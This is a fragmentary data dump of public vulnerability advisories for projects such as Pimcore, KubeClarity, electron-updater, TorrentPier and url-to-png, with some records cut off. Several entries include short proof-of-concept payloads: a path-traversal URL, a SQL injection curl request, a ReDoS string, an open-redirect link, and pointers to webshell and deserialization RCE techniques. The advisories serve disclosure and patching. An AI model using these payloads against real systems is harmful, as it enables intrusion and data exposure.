            "ecosystem": "GIT",
            "id": "<a href='https://osv.dev/vulnerability/CVE-2024-40645' target='_blank'>CVE-2024-40645</a>",
            "details": "<b></b><br>FOG is a cloning&#x2F;imaging&#x2F;rescue suite&#x2F;inventory management system. An improperly restricted file upload feature allows authenticated users to execute arbitrary code on the fogproject server. The Rebranding feature has a check on the client banner image requiring it to be 650 pixels wide and 120 pixels high. Apart from that, there are no checks on things like file extensions. This can be abused by appending a PHP webshell to the end of the image and changing the extension to anything the PHP web server will parse. This vulnerability is fixed in 1.5.10.41.",
            "published": "2024-07-31T19:15:11Z",
            "severity": "0",
            "langs": "php",
            "references": "<ul><li>- <a target='_blank' href='https://github.com/FOGProject/fogproject/blob/a4bb1bf39ac53c3cbe623576915fbc3b5c80a00f/packages/web/lib/pages/fogconfigurationpage.class.php#L2860-L2896'>https://github.com/FOGProject/fogproject/blob/a4bb1bf39ac53c3cbe623576915fbc3b5c80a00f/packages/web/lib/pages/fogconfigurationpage.class.php#L2860-L2896</a></li></ul>"
        }, {
            "ecosystem": "GIT",
            "id": "<a href='https://osv.dev/vulnerability/CVE-2024-41109' target='_blank'>CVE-2024-41109</a>",
            "details": "<b></b><br>Pimcore&#x27;s Admin Classic Bundle provides a backend user interface for Pimcore. Navigating to `&#x2F;admin&#x2F;index&#x2F;statistics` with a logged in Pimcore user exposes information about the Pimcore installation, PHP version, MYSQL version, installed bundles and all database tables and their row count in the system.  This vulnerability is fixed in 1.5.2, 1.4.6, and 1.3.10.",
            "published": "2024-07-30T15:15:12Z",
            "severity": "0",
            "langs": "php",
            "references": "<ul><li>- <a target='_blank' href='https://github.com/pimcore/admin-ui-classic-bundle/blob/1.x/src/Controller/Admin/IndexController.php#L125C24-L125C40'>https://github.com/pimcore/admin-ui-classic-bundle/blob/1.x/src/Controller/Admin/IndexController.php#L125C24-L125C40</a></li><li>- <a target='_blank' href='https://github.com/pimcore/admin-ui-classic-bundle/releases/tag/v1.5.2'>https://github.com/pimcore/admin-ui-classic-bundle/releases/tag/v1.5.2</a></li></ul>"
        }, {
            "ecosystem": "Packagist",
            "id": "<a href='https://osv.dev/vulnerability/GHSA-fx6j-9pp6-ph36' target='_blank'>GHSA-fx6j-9pp6-ph36</a>",
            "details": "<b>Pimcore vulnerable to disclosure of system and database information behind &#x2F;admin firewall</b><br>### Summary\n\nNavigating to `&#x2F;admin&#x2F;index&#x2F;statistics` with a **logged in Pimcore user** (not an XmlHttpRequest because of this check: [IndexController:125](https:&#x2F;&#x2F;github.com&#x2F;pimcore&#x2F;admin-ui-classic-bundle&#x2F;blob&#x2F;1.x&#x2F;src&#x2F;Controller&#x2F;Admin&#x2F;IndexController.php#L125C24-L125C40)) exposes information about the Pimcore installation, PHP version, MYSQL version, installed bundles and all database tables and their row count in the system.\n\n&amp;gt; The web server should not return any product and version information of the components used. The table names and row counts should not be exposed.\n\n### Details\n\n`&#x2F;admin&#x2F;index&#x2F;statistics` returns the following JSON-response:\n```\n{\n    {\n        &quot;instanceId&quot;: &quot;...&quot;,\n        &quot;pimcore_major_version&quot;: 11,\n        &quot;pimcore_version&quot;: &quot;v11.3.1&quot;,\n        &quot;pimcore_hash&quot;: &quot;3ecd39f21dbdd25ffdf4bec6e2c860eccfd3d008&quot;,\n        &quot;pimcore_platform_version&quot;: &quot;v2024.2&quot;,\n        &quot;php_version&quot;: &quot;8.3.8&quot;,\n        &quot;mysql_version&quot;: &quot;10.11.8-MariaDB-ubu2204&quot;,\n    &quot;bundles&quot;: [\n        &#x2F;&#x2F; all installed bundles\n    ],\n    &quot;tables&quot;: [\n        &#x2F;&#x2F; all tables and their row count, e.g:\n        {\n            &quot;name&quot;: &quot;users&quot;,\n            &quot;rows&quot;: 2\n        },\n    ]\n}\n```\n\nInformation about the Pimcore Version can also be seen here:\n\nIn a current Version:\n![[image](https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;f0f478da-ceca-4bd5-a391-3fe8458fa3d2)](https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;f0f478da-ceca-4bd5-a391-3fe8458fa3d2)\n![[image](https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;152f6ad7-2cb3-42eb-bf05-1066a3496d59)](https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;152f6ad7-2cb3-42eb-bf05-1066a3496d59)\n\nIn Pimcore Version 10.6.9:\n![[image](https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;907fb8d8-81b3-450f-bdb0-3e6193bfc243)](https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;907fb8d8-81b3-450f-bdb0-3e6193bfc243)\n![[image](https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;c4d89b88-f458-4023-a29f-d2ef652b2c3b)](https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;c4d89b88-f458-4023-a29f-d2ef652b2c3b)\n\n### PoC\n\n- [[Demo App](https:&#x2F;&#x2F;demo.pimcore.fun&#x2F;admin)](https:&#x2F;&#x2F;demo.pimcore.fun&#x2F;admin) with credentials user: admin and pass: demo\n- Watching Network-Tab in Developer-Tools and looking for `&#x2F;admin&#x2F;index&#x2F;statistics`\n\n### Impact\n\nOnly for logged in Pimcore users possible.\n\n### Workaround and Patch\n\nWe patched the following additional check for Pimcore v10.6.9. This uses an app-specific class but any user permission would be ok.\nThis resolves navigating to `&#x2F;admin&#x2F;index&#x2F;statistics`.\n\n```patch\ndiff --git a&#x2F;vendor&#x2F;pimcore&#x2F;pimcore&#x2F;bundles&#x2F;AdminBundle&#x2F;Controller&#x2F;Admin&#x2F;IndexController.php b&#x2F;vendor&#x2F;pimcore&#x2F;pimcore&#x2F;bundles&#x2F;AdminBundle&#x2F;Controller&#x2F;Admin&#x2F;IndexController.php\n--- a&#x2F;vendor&#x2F;pimcore&#x2F;pimcore&#x2F;bundles&#x2F;AdminBundle&#x2F;Controller&#x2F;Admin&#x2F;IndexController.php    (revision dd81ef4c666b18c254333867a60f6ed455025076)\n+++ b&#x2F;vendor&#x2F;pimcore&#x2F;pimcore&#x2F;bundles&#x2F;AdminBundle&#x2F;Controller&#x2F;Admin&#x2F;IndexController.php    (date 1721225746781)\n@@ -15,6 +15,7 @@\n\nnamespace Pimcore\\Bundle\\AdminBundle\\Controller\\Admin;\n\n+use App\\Constant\\UserPermission;\nuse Doctrine\\DBAL\\Connection;\nuse Exception;\nuse Pimcore\\Analytics\\Google\\Config\\SiteConfigProvider;\n@@ -142,6 +143,12 @@\nthrow $this-&amp;gt;createAccessDeniedHttpException();\n}\n\n+        $user = $this-&amp;gt;tokenResolver-&amp;gt;getUser();\n+\n+        if (!$user-&amp;gt;isAdmin() &amp;&amp; !$user-&amp;gt;isAllowed(UserPermission::ADMIN_INDEX_VIEW)) {\n+            throw $this-&amp;gt;createAccessDeniedException();\n+        }\n+\n&#x2F;&#x2F; DB\ntry {\n$tables = $db-&amp;gt;fetchAllAssociative(&#x27;SELECT TABLE_NAME as name,TABLE_ROWS as `rows` from information_schema.TABLES\n````\n\nFor the Pimcore versions in the UI we used the IndexActionSettingsEvent. This works for Versions &amp;lt; Pimcore 11:\n\n```php\n&amp;lt;?php\n\nnamespace App\\EventListener\\Admin;\n\nuse App\\Constant\\UserPermission;\nuse Pimcore\\Bundle\\AdminBundle\\Event\\AdminEvents;\nuse Pimcore\\Event\\Admin\\IndexActionSettingsEvent;\nuse Pimcore\\Security\\User\\TokenStorageUserResolver;\nuse Symfony\\Component\\EventDispatcher\\EventSubscriberInterface;\n\n&#x2F;**\n* @deprecated and cannot be used in Pimcore 11\n*&#x2F;\nclass PimcoreVersionUIGuardSubscriber implements EventSubscriberInterface\n{\n    public function __construct(private readonly TokenStorageUserResolver $tokenResolver)\n    {\n    }\n\n    public static function getSubscribedEvents()\n    {\n        return [\n            AdminEvents::INDEX_ACTION_SETTINGS =&amp;gt; [&#x27;onIndexActionSettingsEvent&#x27;],\n        ];\n    }\n\n    public function onIndexActionSettingsEvent(IndexActionSettingsEvent $event): void\n    {\n        $user = $this-&amp;gt;tokenResolver-&amp;gt;getUser();\n        if ($user-&amp;gt;isAdmin() || $user-&amp;gt;isAllowed(UserPermission::ADMIN_INDEX_VIEW)) {\n            return;\n        }\n\n        $settings = $event-&amp;gt;getSettings();\n        $settings[&#x27;instanceId&#x27;] = &#x27;&#x27;;\n        $settings[&#x27;version&#x27;] = &#x27;&#x27;;\n        $settings[&#x27;build&#x27;] = &#x27;&#x27;;\n        $event-&amp;gt;setSettings($settings);\n    }\n}\n```",

            "details": "<b>fast-xml-parser vulnerable to ReDOS at currency parsing</b><br>### Summary\nA ReDOS exists on currency.js  was discovered by Gauss Security Labs R&amp;D team.\n\n### Details\nhttps:&#x2F;&#x2F;github.com&#x2F;NaturalIntelligence&#x2F;fast-xml-parser&#x2F;blob&#x2F;master&#x2F;src&#x2F;v5&#x2F;valueParsers&#x2F;currency.js#L10\ncontains a vulnerable regex \n\n### PoC\npass the following string &#x27;\\t&#x27;.repeat(13337)  + &#x27;.&#x27;\n\n### Impact\nDenial of service during currency parsing in experimental version 5 of fast-xml-parser-library\n\nhttps:&#x2F;&#x2F;gauss-security.com",

            "id": "<a href='https://osv.dev/vulnerability/CVE-2024-40644' target='_blank'>CVE-2024-40644</a>",
            "details": "<b></b><br>gitoxide An idiomatic, lean, fast &amp; safe pure Rust implementation of Git. `gix-path` can be tricked into running another `git.exe` placed in an untrusted location by a limited user account on Windows systems. Windows permits limited user accounts without administrative privileges to create new directories in the root of the system drive. While `gix-path` first looks for `git` using a `PATH` search, in version 0.10.8 it also has a fallback strategy on Windows of checking two hard-coded paths intended to be the 64-bit and 32-bit Program Files directories. Existing functions, as well as the newly introduced `exe_invocation` function, were updated to make use of these alternative locations. This causes facilities in `gix_path::env` to directly execute `git.exe` in those locations, as well as to return its path or whatever configuration it reports to callers who rely on it. Although unusual setups where the system drive is not `C:`, or even where Program Files directories have non-default names, are technically possible, the main problem arises on a 32-bit Windows system. Such a system has no `C:\\Program Files (x86)` directory. A limited user on a 32-bit Windows system can therefore create the `C:\\Program Files (x86)` directory and populate it with arbitrary contents. Once a payload has been placed at the second of the two hard-coded paths in this way, other user accounts including administrators will execute it if they run an application that uses `gix-path` and do not have `git` in a `PATH` directory. (While having `git` found in a `PATH` search prevents exploitation, merely having it installed in the default location under the real `C:\\Program Files` directory does not. This is because the first hard-coded path&#x27;s `mingw64` component assumes a 64-bit installation.). Only Windows is affected. Exploitation is unlikely except on a 32-bit system. In particular, running a 32-bit build on a 64-bit system is not a risk factor. Furthermore, the attacker must have a user account on the system, though it may be a relatively unprivileged account. Such a user can perform privilege escalation and execute code as another user, though it may be difficult to do so reliably because the targeted user account must run an application or service that uses `gix-path` and must not have `git` in its `PATH`. The main exploitable configuration is one where Git for Windows has been installed but not added to `PATH`. This is one of the options in its installer, though not the default option. Alternatively, an affected program that sanitizes its `PATH` to remove seemingly nonessential directories could allow exploitation. But for the most part, if the target user has configured a `PATH` in which the real `git.exe` can be found, then this cannot be exploited. This issue has been addressed in release version 0.10.9 and all users are advised to upgrade. There are no known workarounds for this vulnerability.",

            "details": "<b>OpaMiddleware does not filter HTTP OPTIONS requests</b><br>### Summary\n\nHTTP `OPTIONS` requests are always allowed by `OpaMiddleware`, even when they lack authentication, and are passed through directly to the application.\n\nThe maintainer uncertain whether this should be classed as a &quot;bug&quot; or &quot;security issue&quot; \u2013 but is erring on the side of &quot;security issue&quot; as an application could reasonably assume OPA controls apply to *all* HTTP methods, and it bypasses more sophisticated policies.\n\n### Details\n\n`OpaMiddleware` allows all HTTP `OPTIONS` requests without evaluating it against any policy:\n\nhttps:&#x2F;&#x2F;github.com&#x2F;busykoala&#x2F;fastapi-opa&#x2F;blob&#x2F;6dd6f8c87e908fe080784a74707f016f1422b58a&#x2F;fastapi_opa&#x2F;opa&#x2F;opa_middleware.py#L79-L80\n\nIf an application provides different responses to HTTP `OPTIONS` requests based on an entity existing (such as to indicate whether an entity is writable on a system level), an unauthenticated attacker could discover which entities exist within an application (CWE-204).\n\n### PoC\n\nThis toy application is based on the behaviour of an app[^1] which can use `fastapi-opa`. The app uses the `Allow` header of a HTTP `OPTIONS` to indicate whether an entity is writable on a &quot;system&quot; level, and returns HTTP 404 for unknown entities:\n\n[^1]: an open source app, not written by me\n\n```python\n# Run with: fastapi dev opa-poc.py --port 9999\nfrom fastapi import FastAPI, Response, HTTPException\nfrom fastapi_opa import OPAConfig, OPAMiddleware\nfrom fastapi_opa.auth.auth_api_key import APIKeyAuthentication, APIKeyConfig\n\n# OPA doesn&#x27;t actually need to be running for this example\nopa_host = &quot;http:&#x2F;&#x2F;localhost:8181&quot;\napi_key_config = APIKeyConfig(\n    header_key = &#x27;ApiKey&#x27;,\n    api_key = &#x27;secret-key&#x27;,\n)\napi_key_auth = APIKeyAuthentication(api_key_config)\nopa_config = OPAConfig(authentication=api_key_auth, opa_host=opa_host)\n\napp = FastAPI()\napp.add_middleware(OPAMiddleware, config=opa_config)\n\nWRITABLE_ITEMS = {\n    1: True,\n    2: False,\n}\n\n\n@app.get(&quot;&#x2F;&quot;)\nasync def root() -&amp;gt; dict:\n    return {&quot;msg&quot;: &quot;success&quot;}\n\n@app.get(&quot;&#x2F;items&#x2F;{item_id}&quot;)\nasync def read_item(item_id: int):\n    if item_id not in WRITABLE_ITEMS:\n        raise HTTPException(status_code=404)\n    return {&quot;item_id&quot;: item_id}\n\n@app.options(&quot;&#x2F;items&#x2F;{item_id}&quot;)\nasync def read_item_options(response: Response, item_id: int) -&amp;gt; dict:\n    if item_id not in WRITABLE_ITEMS:\n        raise HTTPException(status_code=404)\n\n    response.headers[&quot;Allow&quot;] = &quot;OPTIONS, GET&quot; + (&quot;, POST&quot; if WRITABLE_ITEMS[item_id] else &quot;&quot;)\n    return {}\n```\n\nAs expected, HTTP `GET` requests fail consistently when unauthenticated, regardless of whether the entity exists, because `read_item()` is never executed:\n\n```\n$ curl -i &#x27;http:&#x2F;&#x2F;localhost:9999&#x2F;items&#x2F;1&#x27;\nHTTP&#x2F;1.1 401 Unauthorized\nserver: uvicorn\ncontent-length: 26\ncontent-type: application&#x2F;json\n\n{&quot;message&quot;:&quot;Unauthorized&quot;}\n\n$ curl -i &#x27;http:&#x2F;&#x2F;localhost:9999&#x2F;items&#x2F;3&#x27;\nHTTP&#x2F;1.1 401 Unauthorized\nserver: uvicorn\ncontent-length: 26\ncontent-type: application&#x2F;json\n\n{&quot;message&quot;:&quot;Unauthorized&quot;}\n```\n\nHowever, HTTP `OPTIONS` requests are never authenticated by `OpaMiddleware`, so are passed straight through to `read_item_options()` and returned to unauthenticated users:\n\n```\n$ curl -i -X OPTIONS &#x27;http:&#x2F;&#x2F;localhost:9999&#x2F;items&#x2F;1&#x27;\nHTTP&#x2F;1.1 200 OK\nserver: uvicorn\ncontent-length: 2\ncontent-type: application&#x2F;json\nallow: OPTIONS, GET, POST\n\n{}\n\n$ curl -i -X OPTIONS &#x27;http:&#x2F;&#x2F;localhost:9999&#x2F;items&#x2F;2&#x27;\nHTTP&#x2F;1.1 200 OK\nserver: uvicorn\ncontent-length: 2\ncontent-type: application&#x2F;json\nallow: OPTIONS, GET\n\n{}\n\n$ curl -i -X OPTIONS &#x27;http:&#x2F;&#x2F;localhost:9999&#x2F;items&#x2F;3&#x27;\nHTTP&#x2F;1.1 404 Not Found\nserver: uvicorn\ncontent-length: 22\ncontent-type: application&#x2F;json\n\n{&quot;detail&quot;:&quot;Not Found&quot;}\n```\n\n### Versions\n\n```\nfastapi-opa==2.0.0\nfastapi==0.111.0\n```",

            "details": "<b>TorrentPier Deserialization of Untrusted Data vulnerability</b><br>### Summary\n\nIn `torrentpier&#x2F;library&#x2F;includes&#x2F;functions.php`, `get_tracks()` uses the unsafe native PHP serialization format to deserialize user-controlled cookies:\n\nhttps:&#x2F;&#x2F;github.com&#x2F;torrentpier&#x2F;torrentpier&#x2F;blob&#x2F;84f6c9f4a081d9ffff4c233098758280304bf50f&#x2F;library&#x2F;includes&#x2F;functions.php#L41-L60\n\n### PoC\n\nOne can use [`phpggc`](https:&#x2F;&#x2F;github.com&#x2F;ambionics&#x2F;phpggc&#x2F;) and the chain `Guzzle&#x2F;FW1` to write PHP code to an arbitrary file, and execute commands on the system. For instance, the cookie `bb_t` will be deserialized when browsing to `viewforum.php`.\n",

            "details": "<b>@jmondi&#x2F;url-to-png contains a Path Traversal vulnerability</b><br>### Summary\nWhen trying to add a `BLOCK_LIST` feature when the maintainer noticed they didn&#x27;t sanitize the `ImageId` in the code, which leads to path traversal vulnerability. Now, this is different from a traditional path traversal issue, because as of NOW you can store the image in any place arbitrarily, and given enough time they might be able to come up with a working exploit BUT for the time being they am reporting this.  \n\n### Details\n\n@jmondi&#x2F;url-to-png does not sanitizing the `ImageID` as in not removing special chars from the params [(extract_query_params.ts#l75)](https:&#x2F;&#x2F;github.com&#x2F;jasonraimondi&#x2F;url-to-png&#x2F;blob&#x2F;e43098e0af3a380ebc044e7f303a83933b94b434&#x2F;src&#x2F;middlewares&#x2F;extract_query_params.ts#L75)\n\n```js\nconst imageId = dateString + &quot;.&quot; + slugify(validData.url) +configToString(params);\n```\n\nThis when fed to other parts of the code such as ([filesystem.ts#L34](https:&#x2F;&#x2F;github.com&#x2F;jasonraimondi&#x2F;url-to-png&#x2F;blob&#x2F;8afc00247c1d7e6c7b37356a5f6282b486e596fa&#x2F;src&#x2F;lib&#x2F;storage&#x2F;filesystem.ts#L34))\n\n```js\nreturn path.join(this.storagePath, imageId) + &quot;.png&quot;;\n```\n\nWould result in path traversal issue. \n\n### PoC\n\n```\n# Configuration for filesystem storage provider (optional)\nSTORAGE_PROVIDER=filesystem\nIMAGE_STORAGE_PATH=poc\n```\n\nSet this in your `.env` file and use this as your payload. \n\n```\nhttp:&#x2F;&#x2F;localhost:3089&#x2F;?url=http:&#x2F;&#x2F;example.com&amp;width=400&amp;isDarkMode=..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;hack\n```\n\nThis will create a `.png` file in the `&#x2F;tmp` section of the system.\n\nLoom POC: https:&#x2F;&#x2F;www.loom.com&#x2F;share&#x2F;bd7b306cdae7445c97e68f0626e743a6 \n\n\n\nThis is valid for pretty much all the arguments (except for numeric values)\n\nA simple fix would be to use the `slugify` for the params as well like so ([#L75](https:&#x2F;&#x2F;github.com&#x2F;jasonraimondi&#x2F;url-to-png&#x2F;blob&#x2F;e43098e0af3a380ebc044e7f303a83933b94b434&#x2F;src&#x2F;middlewares&#x2F;extract_query_params.ts#L75))\n\n```diff\n- const imageId = dateString + &quot;.&quot; + slugify(validData.url) + configToString(params);\n+ const imageId = dateString + &quot;.&quot; + slugify(validData.url) + slugify(configToString(params));\n```\n\n\n### Impact\nThis would be path traversal vulnerability which allows arbitrary write as of now. \n",

            "details": "<b>langchain-experimental vulnerable to Arbitrary Code Execution</b><br>Versions of the package langchain-experimental from 0.0.15 and before 0.0.21 are vulnerable to Arbitrary Code Execution when retrieving values from the database, the code will attempt to call &#x27;eval&#x27; on all values. An attacker can exploit this vulnerability and execute arbitrary python code if they can control the input prompt and the server is configured with VectorSQLDatabaseChain.\n\n**Notes:**\n\nImpact on the Confidentiality, Integrity and Availability of the vulnerable component:\n\nConfidentiality: Code execution happens within the impacted component, in this case langchain-experimental, so all resources are necessarily accessible.\n\nIntegrity: There is nothing protected by the impacted component inherently. Although anything returned from the component counts as &#x27;information&#x27; for which the trustworthiness can be compromised.\n\nAvailability: The loss of availability isn&#x27;t caused by the attack itself, but it happens as a result during the attacker&#x27;s post-exploitation steps.\n\n\nImpact on the Confidentiality, Integrity and Availability of the subsequent system:\n\nAs a legitimate low-privileged user of the package (PR:L) the attacker does not have more access to data owned by the package as a result of this vulnerability than they did with normal usage (e.g. can query the DB). The unintended action that one can perform by breaking out of the app environment and exfiltrating files, making remote connections etc. happens during the post exploitation phase in the subsequent system - in this case, the OS.\n\nAT:P: An attacker needs to be able to influence the input prompt, whilst the server is configured with the VectorSQLDatabaseChain plugin.",

            "id": "<a href='https://osv.dev/vulnerability/CVE-2024-39909' target='_blank'>CVE-2024-39909</a>",
            "details": "<b></b><br>KubeClarity is a tool for detection and management of Software Bill Of Materials (SBOM) and vulnerabilities of container images and filesystems. A time&#x2F;boolean SQL Injection is present in the following resource `&#x2F;api&#x2F;applicationResources` via the following parameter `packageID`. As it can be seen in backend&#x2F;pkg&#x2F;database&#x2F;id_view.go, while building the SQL Query the `fmt.Sprintf` function is used to build the query string without the input having first been subjected to any validation. This vulnerability is fixed in 2.23.1.",

            "severity": "0",
            "langs": "go",
            "references": "<ul><li>- <a target='_blank' href='https://github.com/openclarity/kubeclarity/blob/main/backend/pkg/database/id_view.go#L79'>https://github.com/openclarity/kubeclarity/blob/main/backend/pkg/database/id_view.go#L79</a></li></ul>"

            "id": "<a href='https://osv.dev/vulnerability/GHSA-5248-h45p-9pgw' target='_blank'>GHSA-5248-h45p-9pgw</a>",
            "details": "<b>SQL Injection in the KubeClarity REST API</b><br>### Summary\nA time&#x2F;boolean SQL Injection is present in the following resource `&#x2F;api&#x2F;applicationResources` via the following parameter `packageID`\n\n### Details\nAs it can be seen [here](https:&#x2F;&#x2F;github.com&#x2F;openclarity&#x2F;kubeclarity&#x2F;blob&#x2F;main&#x2F;backend&#x2F;pkg&#x2F;database&#x2F;id_view.go#L79), while building the SQL Query the `fmt.Sprintf` function is used to build the query string without the input having first been subjected to any validation.\n\n### PoC\nThe following command should be able to trigger a basic version of the behavior:\n`curl -i -s -k -X $&#x27;GET&#x27; \\\n    -H $&#x27;Host: kubeclarity.test&#x27; \\\n    $&#x27;https:&#x2F;&#x2F;kubeclarity.test&#x2F;api&#x2F;applicationResources?page=1&amp;pageSize=50&amp;sortKey=vulnerabilities&amp;sortDir=DESC&amp;packageID=c89973a6-4e7f-50b5-afe2-6bf6f4d3da0a\\&#x27;HTTP&#x2F;2&#x27;`\n\n### Impact\nWhile using the Helm chart, the impact of this vulnerability is limited since it allows read access only to the kuberclarity database, to which access is already given as far as I understand to regular users anyway.\nOn the other hand, if Kuberclarity is deployed in a less secure way, this might allow access to more data then allowed or expected (beyond the limits of the KuberClarity database). The vulnerable line was introduced as part of the initial commit of Kubeclarity, so all versions up until the latest (2.23.1) are assumed vulnerable.",

            "details": "<b></b><br>electron-updater allows for automatic updates for Electron apps. The file `packages&#x2F;electron-updater&#x2F;src&#x2F;windowsExecutableCodeSignatureVerifier.ts` implements the signature validation routine for Electron applications on Windows. Because of the surrounding shell, a first pass by `cmd.exe` expands any environment variable found in command-line above. This creates a situation where `verifySignature()` can be tricked into validating the certificate of a different file than the one that was just downloaded. If the step is successful, the malicious update will be executed even if its signature is invalid. This attack assumes a compromised update manifest (server compromise, Man-in-the-Middle attack if fetched over HTTP, Cross-Site Scripting to point the application to a malicious updater server, etc.). The patch is available starting from 6.3.0-alpha.6.",
            "published": "2024-07-09T18:15:10Z",
            "severity": "7.5",
            "langs": "ts",
            "references": "<ul><li>- <a target='_blank' href='https://github.com/electron-userland/electron-builder/security/advisories/GHSA-9jxc-qjr9-vjxq'>https://github.com/electron-userland/electron-builder/security/advisories/GHSA-9jxc-qjr9-vjxq</a></li><li>- <a target='_blank' href='https://github.com/electron-userland/electron-builder/pull/8295'>https://github.com/electron-userland/electron-builder/pull/8295</a></li><li>- <a target='_blank' href='https://github.com/electron-userland/electron-builder/blob/140e2f0eb0df79c2a46e35024e96d0563355fc89/packages/electron-updater/src/windowsExecutableCodeSignatureVerifier.ts#L35-L41'>https://github.com/electron-userland/electron-builder/blob/140e2f0eb0df79c2a46e35024e96d0563355fc89/packages/electron-updater/src/windowsExecutableCodeSignatureVerifier.ts#L35-L41</a></li></ul>"
        }, {
            "ecosystem": "npm",
            "id": "<a href='https://osv.dev/vulnerability/GHSA-9jxc-qjr9-vjxq' target='_blank'>GHSA-9jxc-qjr9-vjxq</a>",
            "details": "<b>electron-updater Code Signing Bypass on Windows</b><br>### Observations\nThe file `packages&#x2F;electron-updater&#x2F;src&#x2F;windowsExecutableCodeSignatureVerifier.ts` implements the signature validation routine for Electron applications on Windows. It executes the following command in a new shell (`process.env.ComSpec` on Windows, usually `C:\\Windows\\System32\\cmd.exe`):\n\nhttps:&#x2F;&#x2F;github.com&#x2F;electron-userland&#x2F;electron-builder&#x2F;blob&#x2F;140e2f0eb0df79c2a46e35024e96d0563355fc89&#x2F;packages&#x2F;electron-updater&#x2F;src&#x2F;windowsExecutableCodeSignatureVerifier.ts#L35-L41\n\nBecause of the surrounding shell, a first pass by `cmd.exe` expands any environment variable found in command-line above.\n\n### Exploitation\n\nThis creates a situation where `verifySignature()` can be tricked into validating the certificate of a different file than the one that was just downloaded. If the step is successful, the malicious update will be executed even if its signature is invalid. \n\n### Impact\n\nThis attack assumes a compromised update manifest (server compromise, Man-in-the-Middle attack if fetched over HTTP, Cross-Site Scripting to point the application to a malicious updater server, etc.).\n\n### Patch\n\nThis vulnerability was patched in #8295, by comparing the path in the output of `Get-AuthenticodeSignature` with the intended one. The patch is available starting from 6.3.0-alpha.6.",

            "id": "<a href='https://osv.dev/vulnerability/GHSA-564j-v29w-rqr6' target='_blank'>GHSA-564j-v29w-rqr6</a>",
            "details": "<b>Khoj Open Redirect Vulnerability in Login Page</b><br>### Summary\nAn attacker can use the `next` parameter on the login page to redirect a victim to a malicious page, while masking this using a legit-looking `app.khoj.dev` url.\nFor example, `https:&#x2F;&#x2F;app.khoj.dev&#x2F;login?next=&#x2F;&#x2F;example.com` will redirect to the https:&#x2F;&#x2F;example.com page.\n\n### Details\nThe problem seems to be in this method: https:&#x2F;&#x2F;github.com&#x2F;khoj-ai&#x2F;khoj&#x2F;blob&#x2F;2667ef45449eb408ce1d7c393be04845be31e15f&#x2F;src&#x2F;khoj&#x2F;routers&#x2F;auth.py#L95\n\n### PoC\nOpen the `https:&#x2F;&#x2F;app.khoj.dev&#x2F;login?next=&#x2F;&#x2F;example.com` url in a Gecko-based browser (Firefox).\n\n### Impact\nThe impact is low, and this could only be used in phishing attempts, but it&#x27;s still a problem nonetheless.",

            "details": "<b>Malicious Matrix homeserver can leak truncated message content of messages it shouldn&#x27;t have access to</b><br>### Impact\n\nThe fix for GHSA-wm4w-7h2q-3pf7 &#x2F; [CVE-2024-32000](https:&#x2F;&#x2F;www.cve.org&#x2F;CVERecord?id=CVE-2024-32000) included in matrix-appservice-irc 2.0.0 relied on the Matrix homeserver-provided timestamp to determine whether a user has access to the event they&#x27;re replying to when determining whether or not to include a truncated version of the original event in the IRC message. Since this value is controlled by external entities, a malicious Matrix homeserver joined to a room in which a matrix-appservice-irc bridge instance (before version 2.0.1) is present can fabricate the timestamp with the intent of tricking the bridge into leaking room messages the homeserver should not have access to.\n\n### Patches\n\nmatrix-appservice-irc 2.0.1 [drops the reliance](https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-appservice-irc&#x2F;pull&#x2F;1804) on `origin_server_ts` when determining whether or not an event should be visible to a user, instead tracking the event timestamps internally.\n\n### Workarounds\n\nIt&#x27;s possible to limit the amount of information leaked by setting a reply template that doesn&#x27;t contain the original message. See [these lines](https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-appservice-irc&#x2F;blob&#x2F;d5d67d1d3ea3f0f6962a0af2cc57b56af3ad2129&#x2F;config.sample.yaml#L601-L604) in the configuration file.\n\n### References\n\n- Patch: https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-appservice-irc&#x2F;pull&#x2F;1804\n\n### For more information\n\nIf you have any questions or comments about this advisory, please email us at [security at matrix.org](mailto:security@matrix.org).",

            "details": "<b></b><br>matrix-appservice-irc is a Node.js IRC bridge for the Matrix messaging protocol. The fix for GHSA-wm4w-7h2q-3pf7 &#x2F; CVE-2024-32000 included in matrix-appservice-irc 2.0.0 relied on the Matrix homeserver-provided timestamp to determine whether a user has access to the event they&#x27;re replying to when determining whether or not to include a truncated version of the original event in the IRC message. Since this value is controlled by external entities, a malicious Matrix homeserver joined to a room in which a matrix-appservice-irc bridge instance (before version 2.0.1) is present can fabricate the timestamp with the intent of tricking the bridge into leaking room messages the homeserver should not have access to. matrix-appservice-irc 2.0.1 drops the reliance on `origin_server_ts` when determining whether or not an event should be visible to a user, instead tracking the event timestamps internally. As a workaround, it&#x27;s possible to limit the amount of information leaked by setting a reply template that doesn&#x27;t contain the original message.",

            "details": "<b></b><br>SkillTree is a micro-learning gamification platform. Prior to version 2.12.6, the endpoint \n`&#x2F;admin&#x2F;projects&#x2F;{projectname}&#x2F;skills&#x2F;{skillname}&#x2F;video` (and probably others) is open to a cross-site request forgery (CSRF) vulnerability. Due to the endpoint being CSRFable e.g POST request, supports a content type that can be exploited (multipart file upload), makes a state change and has no CSRF mitigations in place (samesite flag, CSRF token). It is possible to perform a CSRF attack against a logged in admin account, allowing an attacker that can target a logged in admin of Skills Service to modify the videos, captions, and text of the skill. Version 2.12.6 contains a patch for this issue.\n",

            "references": "<ul><li>- <a target='_blank' href='https://github.com/gorilla/schema/blob/main/decoder.go#L223'>https://github.com/gorilla/schema/blob/main/decoder.go#L223</a></li></ul>"

            "ecosystem": "Go",
            "id": "<a href='https://osv.dev/vulnerability/GHSA-3669-72x9-r9p3' target='_blank'>GHSA-3669-72x9-r9p3</a>",
